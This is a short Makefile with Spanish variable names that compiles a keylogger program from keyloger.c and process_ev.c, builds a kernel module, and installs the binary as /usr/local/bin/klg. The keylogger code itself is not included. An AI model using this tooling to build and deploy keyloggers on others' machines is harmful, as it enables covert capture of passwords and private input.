obj-m := klg.o

FUENTES = keyloger.c process_ev.c
OBJS = keyloger.o process_ev.o
PROGRAMA = keylog

${OBJS}: ${FUENTES}
	gcc -g -c ${FUENTES}

${PROGRAMA}: ${OBJS}
	gcc -o ${PROGRAMA} ${OBJS}

module:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules

all: ${PROGRAMA}

install: ${PROGRAMA}
	install -m 755 ${PROGRAMA} /usr/local/bin/klg
clean:
	rm -f ${OBJS} ${PROGRAMA}
	rm -rf *.o *.ko *.symvers *.mod.* *.order



